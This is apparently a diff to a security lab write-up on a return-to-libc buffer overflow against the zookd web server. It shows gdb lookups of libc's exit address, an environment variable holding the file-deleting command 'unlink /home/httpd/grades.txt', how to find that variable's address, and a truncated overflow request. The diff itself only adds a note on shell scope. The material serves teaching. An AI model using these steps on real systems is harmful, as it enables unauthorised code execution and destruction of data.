@@ -183,7 +183,7 @@ The printed address is the one we will be using in our exploit in the RET call. 
     (gdb) p exit
     $2 = {<text variable, no debug info>} 0xb7e5e150 <__GI_exit>
 
-Next, we create the environment variable that we will be using in our exploit.
+Next, we create the environment variable that we will be using in our exploit. 
 
     export RM="unlink /home/httpd/grades.txt"
     
@@ -192,6 +192,11 @@ Now we need to locate the environment variable address in the memory. We used a 
     httpd@vm-6858:~/lab$ ./getenv RM
     RM is stored at address 0xbffff8ca
     
+It is important to note that the environment variable we create is only good in the shell under which it is created. If we try to search the variable in another shell, we get an error:
+
+    ./getenv RM
+    Environmental variable RM does not exist!
+
 The memory address of the environment variable is not always the exact address and usually it is necessary to deduce the environment variable address:
 
     zookd-nxstack: [2352] Request failed: Error forwarding request: /AAAAAA.....snip....AAAAAAAA
